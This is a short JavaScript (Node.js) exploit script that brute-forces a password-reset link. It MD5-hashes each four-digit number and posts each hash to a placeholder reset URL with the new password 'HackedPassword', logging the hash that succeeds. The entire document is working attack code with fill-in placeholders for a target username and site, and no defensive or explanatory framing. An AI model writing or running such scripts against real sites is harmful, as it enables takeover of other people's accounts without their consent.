const crypto = require('crypto');
const axios = require('axios');

// Exploit configuration
const targetUsername = 'target_username'; // Replace with the target username
const targetURL = `http://vulnerable-site.com/reset_password?username=${targetUsername}&hash=`; // Replace with the target URL

// Run exploit
for (let i = 1000; i <= 9999; i++) { // Assuming a range of possible hash values
    const generatedHash = crypto.createHash('md5').update(String(i)).digest('hex'); // Generate hash from integer i

    axios.post(targetURL + generatedHash, { newPassword: 'HackedPassword' })
        .then(response => {
            if (response.data === 'Password changed successfully') {
                console.log('Reset hash found:', generatedHash);
                console.log('Password changed for user:', targetUsername);
                process.exit(0);
            }
        })
        .catch(error => {
            // Ignore invalid hash response
        });
}
console.log('Failed to exploit. No valid hash found.');
